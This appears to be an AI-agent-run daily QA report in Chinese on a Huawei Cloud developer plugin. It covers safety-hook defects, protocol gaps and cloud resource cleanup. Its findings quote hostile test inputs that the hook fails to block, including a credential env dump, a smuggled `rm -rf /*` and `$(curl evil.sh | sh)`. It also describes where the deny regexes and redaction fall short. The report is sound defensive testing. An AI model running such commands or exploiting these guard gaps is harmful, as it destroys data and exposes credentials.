# Hermes-deepseek-v4.1-flash-1017 每日测试报告

> **报告名**：`Hermes-deepseek-v4.1-flash-1017-测试报告.md`
> **生成时间**：2026-11-15 05:16（北京时间）
> **执行归档**：`results/Hermes/2026-11-15-120.46.176.133/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 3 项 FAIL + 1 项 SPEC）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `Hermes` + `deepseek-v4.1-flash-1017` |
| OS / 架构 | `Linux` (aarch64, node v22.13.0 / npm 10.9.2) |
| 被测版本（SUT） | `v1.1.13`（npm `latest` 正式版，gitHead `8a6d8be2`；源码仓 `hdk` checkout 同 commit） |
| 执行机器 | 120.46.176.133（`ecs-hd-ai-work-00-0015`, Ubuntu 24.04.4 LTS） |
| daily 基础用例 | 设计级 107 / 展开级 43 = **150** |
| 真云区域 | `cn-north-4`（统一账号 hw018619646） |

> **执行方法**：探针直调 `hdk/plugins/huaweicloud-core/src/` 导出函数（classify/hook/auth/protocol/extended/supplement/new-* 等 43 步，见执行包内 `run_all.sh`，本轮 43 步全部 `exit=0`）+ spawn `mcp-server.mjs` 驱动 MCP 协议（D9-12/D9-13/D10-3）+ `eval/harness/run-eval.mjs` 跑 15 条中文评测集 + 真云 E2E 建删资源（D3-C1 ECS 全生命周期 / D3-C2 OBS 静态站 / D3-C3·D3-C6 沙箱 / D3-C7 跨区域 / D3-S6 FunctionGraph 定时任务 / D4-13 只读子账号 / D4-14 审批流 CTS 审计）。每个用例证据落 `evidence/<case-id>/`（probe 脚本 + `stdout.txt`），`evidencePath` 已回填；PASS 门禁 `verify_no_fake_pass.py`、覆盖率门禁 `verify_coverage.py` 均通过。

> **被测版本选择说明**：`npm view huaweicloud-devkit dist-tags` 当前为 `latest=1.1.13`、`next=1.1.14-next.5`。`prepare_env.py` 默认按版本号取最高者（本轮会自动切 `@next`，`sync_agent_plugin` 亦失败），而 AGENTS.md 明确被测包为「npm latest 正式版」，故本轮显式 `prepare_env.py --update --latest` 钉住 **v1.1.13** 执行（同步日志：`Hermes 插件已同步: Hermes: 1.1.13`）。`next` 预发布验证留待用例体系按 pre-release 结构核验后单独覆盖（见 §八）。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `150`（设计级 107 + 展开级 43） |
| 已执行 | `146`（唯一未执行 = 4 条 NOT_RUN，均为不适用/需白盒比对项） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `126 / 11 / 6 / 3 / 4` |
| 通过率（分母 = PASS+FAIL = 137） | `92.0%` |
| 缺陷（P0 / P1 / P2） | `4 / 5 / 4`（合计 13 项，全部为 v1.1.13 历史复现，无新增） |
| 红线（I 类）违规 | `无` |
| 资源释放 | `真云建删资源全部归零（ECS 0 / VPC 0 / 子网 0 / EIP 0 / FunctionGraph 0 / RDS 0 / 本次 OBS 桶已删，见 §七）` |
| 增量提报 | `已按每 10 分钟后台循环提报（hourly_wrap_1115.sh → hourly_sync.py Hermes Linux）` |

---

## 三、状态汇总

### 3.1 设计级（107）

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `84` | 有证据且通过 PASS 门禁（较上轮 +1：D3-S6 探针修正后真实通过） |
| FAIL | `10` | 不符预期，根因见 §四 |
| BLOCKED | `6` | 环境/权限/夹具阻塞（较上轮 +1：D3-S7 由 FAIL 改判「补环境」） |
| SPEC-MISMATCH | `3` | 契约漂移 |
| NOT_RUN | `4` | 未执行（P0 无 NOT_RUN） |
| **合计** | **`107`** | P0 21 条全部 PASS/FAIL/SPEC，无 NOT_RUN/空 |

### 3.2 展开级（43）

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `42` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | `EXP-E01`「云主机」意图路由 MISS，与 D10-3 同根因 |
| BLOCKED / SPEC-MISMATCH / NOT_RUN | `0 / 0 / 0` | — |
| **合计** | **`43`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|
| 1 | P0 | `D4-2` | D4安全 | 凭证 env 打印拦截未覆盖 generic `access_key` | `src/safety-policy.mjs:550` env-dump 正则只匹配云厂商前缀（`HUAWEICLOUD\|HWC_\|HW_\|HCLOUD\|OS_`），不匹配裸 `access_key` | 历史复现 |
| 2 | P0 | `D4-21` | D4安全 | hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品 | `safety/rules/cloud-risk-rules.json:196`（hwc-iam-admin-policy）regex 未覆盖 HCL `actions = ["*"]` 与 `AdministratorFullAccess` | 历史复现 |
| 3 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线两处缺口 | `src/mcp-protocol.mjs:34-42` initialize 未调 `runVersionCheck`；`mcp-protocol.mjs:61` dispatch 对 `tools/list` 无 initialize 前置状态机（应 -32600） | 历史复现 |
| 4 | P0 | `D10-4` | D10评测 | 风险规则库条目数漂移（SPEC） | `safety/rules/cloud-risk-rules.json` 规则 16→19 条（9 deny + 10 warn），用例断言未同步 | 历史复现 |
| 5 | P1 | `D1-70` | D1安装 | 代理配置 WebSocket 路径崩溃（undici 依赖 node zstd） | `src/proxy/proxy-agent.mjs:20-22` 回退 bundled `undici@8.12.2` → `undici/lib/interceptor/decompress.js:78` 解构 `node:zlib.createZstdDecompress`（node 22.13 无）→ `undefined.bind` | 历史复现 |
| 6 | P1 | `D4-6` | D4安全 | adminPass 不告警 + flag/JSON 形态未脱敏 | `safety/rules/cloud-risk-rules.json:68`（hwc-command-adminpass-exposure）stages 缺 `command`；`safety-policy.mjs` redactSecrets 未覆盖 `--admin_pass` 空格形态与 JSON 带引号 key | 历史复现 |
| 7 | P1 | `D4-17` | D4安全 | hook 模糊输入 fail-open（默认放行） | `src/risk-rule-engine.mjs:106` `evaluate()` 无规则命中默认 `allow` | 历史复现 |
| 8 | P1 | `D10-3` / `EXP-E01` | D10评测 | serviceCatalog 中文「云主机」意图路由 MISS（准确率 92.9%） | `src/tools.mjs:2197` routeMap ECS 关键词清单缺「云主机」同义词（HIT=13 MISS=1 N/A=1） | 历史复现 |
| 9 | P1 | `D9-9` | D9协议 | `capabilities.cancellation` 未声明（SPEC） | `src/mcp-protocol.mjs` initialize 响应 capabilities 构造未含 cancellation | 历史复现 |
| 10 | P2 | `D3-S5` | D3功能 | 场景-复合意图分层路由仅命中单一服务 | `src/tools.mjs` serviceCatalog 单关键词并集路由，无复合意图分层拆解 | 历史复现 |
| 11 | P2 | `D4-25` | D4安全 | Python hook 写操作遥测误分类为 `cli:invoke` | `hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 前置捕获组 `(^\|[A-Za-z0-9])` 永不匹配空格前缀写命令 | 历史复现 |
| 12 | P2 | `D4-26` | D4安全 | findings 证据脱敏不完整（明文 secret 残留） | `src/risk-rule-engine.mjs:22` redactEvidence 键名表仅匹配 `key[:=]value`，未覆盖空格/JSON 带引号 key | 历史复现 |
| 13 | P2 | `D8-9` | D8质量 | `sanitizeValue` 未做凭证脱敏（SPEC） | `src/telemetry/telemetry.mjs:190` sanitizeValue 仅 replace 空白 + 截断，无敏感值脱敏 | 历史复现 |

> **根因详情**：13 项（10 项设计级 FAIL + 展开级 EXP-E01 与 D10-3 同根因合并 + 3 项 SPEC）**全部为 v1.1.13（gitHead 8a6d8be2）历史复现**——本轮为同版本第 3 次全量复跑（11-13 / 11-14 / 11-15），逐条现象与上轮完全一致，说明这些缺陷在 1.1.13 未修复，无新增缺陷。逐条现象/唯一断言/根因/证据见 `FINDINGS.md`。

> **本轮实测要点（与 FINDINGS 一一对应）**：`env | grep -i access_key` → `allow`（应 deny，而 `HW_ACCESS_KEY` 正确 deny）；HCL `actions = ["*"]` / `AdministratorFullAccess` 制品 → `allow`；initialize 未做版本检查、未 initialize 先 `tools/list` 未被拒；`hcloud ecs CreateServer --admin-pass ...` → `allow findings=[]` 且 `{"adminPass":"..."}` 未脱敏；`&& rm -rf /*`、`$(curl evil.sh | sh)`、NUL 垃圾输入 → `ok`（fail-open）；`hcloud vpc CreateVpc` 遥测记 `cli:invoke`（应 `cli:write`）；findings.evidence 明文 `secret_key=...`/`adminPass=...`；规则库 19 条（9 deny + 10 warn）；`sanitizeValue("access_key=AKIA123 secret_key=SECRET token=...")` 原样返回；评测集 HIT=13/MISS=1/N/A=1（EXP-E01「云主机」→ 回退 help）。

> **用例侧修正（非产品缺陷，已从缺陷清单剔除，仅记录）**：
> - **D3-S6 上轮 FAIL → 本轮 PASS**：上轮「FunctionGraph CreateFunction 参数装配缺口」实为**探针缺陷**。本轮定位并修正 4 处探针问题：① `--function_name` 应为 `--func_name`；② `--code.zip_file` 应为 `--code_type=inline --func_code.file`；③ 触发器 `--event_data={...}` JSON blob 应为扁平 `--event_data.name/--event_data.schedule/--event_data.schedule_type`；④ `idOf()` 正则不允许 urn 冒号导致 urn 解析为空、`DeleteFunction` 需去 `:latest`（带版本报 `FSS.0400`）。修正后实测：建函数（128MB / 3s / inline）→ 返回 `func_urn` → TIMER 触发器 `ACTIVE` 且 `ListFunctionTriggers` 可查 → 删除函数并复核列表无残留，**4/4 断言通过**（`evidence/D3-S6/stdout.txt`）。
> - **D3-S7 上轮 FAIL → 本轮 BLOCKED（补环境）**：`hcloud RDS CreateInstance --help`（7.2.12）未暴露任何 password 参数（API 必填 `db.password`），且真实创建需 VPC/子网/安全组前置夹具；本轮已实测 `ListInstances` 只读可达（`ok=true`）、未创建任何实例、零残留 → 按「环境不满足用 BLOCKED」口径归入 §五，不再算产品缺陷。

---

## 五、未执行用例与原因

### NOT_RUN（4）

| 用例ID | 层级 | 优先级 | 维度 | 标题 | 分类 | 详细原因 / 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | D1安装 | Windows 升级检测链可用性 | 【调归属】 | OS 列标注「专属」（Windows EINVAL 专属），本机 Linux 不适用；Linux 侧由展开级 `EXP-NR3-10`（disttags 探针）代表覆盖，已 PASS。建议母版把该用例 `OS` 列明确为 `Windows（专属）` 以便门禁豁免。 |
| `D8-1` | 设计级 | P1 | D8质量 | 文档与能力一致 | 【改用例】 | 需白盒 `docs/` 全量比对（每篇文档 ↔ 40 个 MCP 工具/CLI 命令），当前 daily 无对应探针。建议补 `docs-coverage-probe.mjs`（解析 docs 目录 + 工具清单做差集）后再纳入。 |
| `D8-4` | 设计级 | P1 | D8质量 | 引导步骤可机械执行 | 【改用例】 | 需逐条执行 getting-started 引导步骤（含交互式 install 分支），无自动化夹具。建议拆为「可脚本化步骤」子用例 + 人工核验项。 |
| `D8-6` | 设计级 | P1 | D8质量 | 中英文文档一致 | 【改用例】 | 需中英双源逐段比对（heading/代码块/参数表三元组），当前无对齐基准。建议在 `test-cases` 引入 docs 双语快照后由脚本比对。 |

### BLOCKED（6）

| 用例ID | 层级 | 优先级 | 维度 | 阻塞原因（实测时间 + 缺什么 + 影响 + 解除条件） |
|---|---|---|---|---|
| `D3-S7` | 设计级 | P2 | D3功能 | **【补环境】** 2026-11-15 05:07 实测：`hcloud RDS CreateInstance --help`（KooCLI 7.2.12）无 password 类参数暴露（API 必填 `db.password`），探针无法组装合法请求；另需 VPC/子网/安全组前置与 RDS 配额。影响：跨服务交付（Web+RDS）端到端无法闭环，仅 `ListInstances` 只读可达（`ok=true`）、复合意图路由 RDS 命中/部署目标未命中已取证。解除条件：KooCLI 升级到暴露 password 的版本（或改用 RDS v3 REST 直连）+ 预置 VPC/子网/SG 夹具。本轮零资源创建、零残留。 |
| `D2-10` | 设计级 | P1 | D2认证 | **【补环境】** 需 KooCLI 多 profile 夹具（`current=deploy` 切换）。影响：R7 current 档跟随行为无法验证。解除条件：预置 2 个 KooCLI profile 并在隔离 HOME 下切换。 |
| `D2-13` | 设计级 | P1 | D2认证 | **【补环境】** R9 `configuredBySession` 优先 env 需隔离 S1 + `HW_ACCESS_KEY` env 夹具；当前替换会污染统一账号凭证库。影响：会话级凭证优先级未验证。解除条件：提供隔离 HOME + 可回滚的凭证注入夹具。 |
| `D4-12` | 设计级 | P1 | D4安全 | **【补环境】** 供应链安装期安全需 npm 安装期抓包 / SBOM 审计通道。影响：安装脚本行为与依赖来源未审计。解除条件：提供 `npm install --foreground-scripts` 抓包 + SBOM 生成通道。 |
| `D4-24` | 设计级 | P1 | D4安全 | **【补环境】** 确认令牌过期/重复确认边界需审批流 + 可注入时钟。影响：审批令牌健壮性边界未验证。解除条件：审批服务暴露可注入 TTL / 冻结时钟的测试入口。 |
| `D9-6` | 设计级 | P2 | D9协议 | **【调归属】** 跨客户端互通需多客户端并存环境（本机仅 Hermes）。影响：跨客户端 MCP 互通未验证。解除条件：同机部署 2+ 客户端或按客户端拆分归属。 |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`无`（本轮探针未触发真实 AK/SK 明文外泄；`D4-26` findings.evidence 明文残留是产品侧缺陷，已记 FINDINGS #12，非本 agent 操作泄漏）
- [x] 写操作误判 read-only：`无`（`D4-13` 只读子账号实测 writeDenied=true，最小权限通过率 100%，未创建任何 VPC）
- [x] 红线（I 类）违规：`无`（真云用例均最低配置创建 → 测后删除 → 归零验证；未 mock、未碰他人/既有资源、未改 `test-cases/` 母版与 `Summary`）
- [x] 脱敏复核：`已完成`（`D4-6`/`D4-27` 源码级 redactSecrets 双路径验证；`D4-26` 残留缺口已记缺陷）
- [x] 目录权限：仅写入 `results/Hermes/2026-11-15-120.46.176.133/Linux/`，未触碰其他客户端目录 / Summary / 用例母版

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| ECS（D3-C1，`testbot3-hermes-ecs-4690549822`） | ✅ 创建成功（job `ff808081a0ed144001a1dbdf80203a85`，serverId `f846dc7b-f077-4aa5-94ca-111784e582cc`） | ✅ 手工 `DeleteServers --servers.1.id=...`（clean_1115.py 多轮重试） | ✅ `ListServersDetails` count=0 |
| VPC（D3-C1，`testbot3-hermes-e2e-4690549822`） | ✅ 创建成功 | ✅ `DeleteVpc --vpc_id=...`（子网未删尽时 `VPC.0104 RouterInUse`，重试成功） | ✅ `ListVpcs` 空 |
| Subnet（D3-C1） | ✅ 创建成功 | ✅ `DeleteSubnet --vpc_id --subnet_id`（首轮 `VPC.0209 subnet is still used`，ECS 释放后重试成功） | ✅ `ListSubnets` 空 |
| OBS 桶（D3-C2，`testbot3-hermes-obs-4690376382`） | ✅ 建桶 + 静态站（request id `000001A1DBE1E36B4416BD723242E367`） | ✅ 探针内 `obs rm`（Delete bucket successfully） | ✅ `hcloud obs ls` 无本次桶（仅存他机 `testbot5-hermes-obs-*`，未触碰） |
| FunctionGraph（D3-S6，`hdk-s6-mwgw*` ×2 轮） | ✅ CreateFunction（128MB/3s/inline）+ TIMER 触发器 ACTIVE | ✅ `DeleteFunction`（去 `:latest` 版本后缀） | ✅ `ListFunctions` 空 |
| VPC（D4-14 审批流，`tctest-hermes-20261012-gw7m2m`） | ✅ CreateVpc（CTS 审计已取证） | ✅ DeleteVpc | ✅ `ListVpcs` 不含本次资源 |
| EIP（D3-C7 跨区域，`7cb4899e-1fec-49fc-b585-bf5fb4a77bd6`） | ✅ CreatePublicip（带 `--cli-region`） | ✅ DeletePublicip | ✅ `ListEips` 无本次 id / total_count=0 |
| 沙箱（D3-C3 / D3-C6） | ✅ connect/deploy/exec_one_shot | ✅ close_session | ✅ 会话关闭，`hdk-sandbox-ok` 输出 |

> **全域残留复核（`clean_1115.py` + `hcloud`，2026-11-15 05:09–05:16 BJT）**：`ECS ListServersDetails count=0` / `VPC ListVpcs` 空 / `VPC ListSubnets` 空 / `EIP ListPublicips total_count=0` / `FunctionGraph ListFunctions` 空 / `RDS ListInstances total_count=0` / OBS 本次桶已删。
> D3-C1 自动化 finally 的 ECS 删除轮询（150s）短于 ECS 异步删除耗时，第 5 项断言记 false（`ECS:提交删除 ECS轮询:仍在/未确认 subnet:OK vpc:OK`），属**探针轮询窗口偏短**，已按本次 serverId 定向手工补删并在 `evidence/D3-C1/stdout.txt` 追加「手工归零补充」证据，非产品缺陷。清理严格按本次资源名/ID 匹配，未误删 `tctest-*` 等他人资源。

---

## 八、遗留与建议

- 13 项缺陷全部为历史复现（v1.1.13 同 commit，第 3 次复跑一致），无新增；其中 3 项 SPEC（`D8-9`/`D9-9`/`D10-4`）属契约/断言漂移，建议维护者按 FINDINGS 更新用例母版断言，而非改实现。
- P0 安全缺口集中在 `safety-policy.mjs`（D4-2 env 正则）、`cloud-risk-rules.json`（D4-21 HCL 形态）、`mcp-protocol.mjs`（D9-12 握手状态机），建议优先修复这三处。
- `D1-70`：bundled `undici@8.12.2` 依赖 node zstd API（node ≥22.15），本机 node v22.13.0 触发 `undefined.bind` 崩溃；建议 devkit 声明 Node 下限（≥22.15）或对 undici 加载加守卫/降级，避免「声明 Node>=22 却崩」。
- `D3-S7` 需 KooCLI 侧暴露 RDS `password` 参数（或改 REST 直连）+ VPC/子网/SG 夹具，否则跨服务交付场景在 Linux 侧永远无法闭环，建议用例母版标注「需前置夹具」。
- **`next` 预发布（当前 `next=1.1.14-next.5`）未纳入 daily**：`prepare_env.py` 默认取版本号最高者会自动切 `@next`（本轮 `sync_agent_plugin` 因此失败），已显式 `--latest` 钉住 v1.1.13；建议用例母版产出 next 专用探针集后，以 `prepare_env.py --next` 单独跑一轮预发布测试。
- 测试夹具可持续改进：本轮修正的 D3-S6 探针（参数名/urn 解析/触发器扁平参数/删除去版本）已回写 `evidence/_probes/new-fg-rds-probe.mjs` 与 `evidence/D3-S6/probe.mjs`，建议上游 `test-cases/` 母版同步该修正，避免其他客户端重复踩坑（KooCLI 参数形态与 API v2/v3 字段名差异是共性陷阱）。
- 建议测试侧修复 `scripts/realcloud_e2e.mjs` 的 D3-C1 ECS 删除轮询（150s 偏短，建议 ≥300s + 递增退避）与 `sh().ok` 退出码假阳性（本地判定已在 evidence 人工补充，未改仓库 `scripts/`）。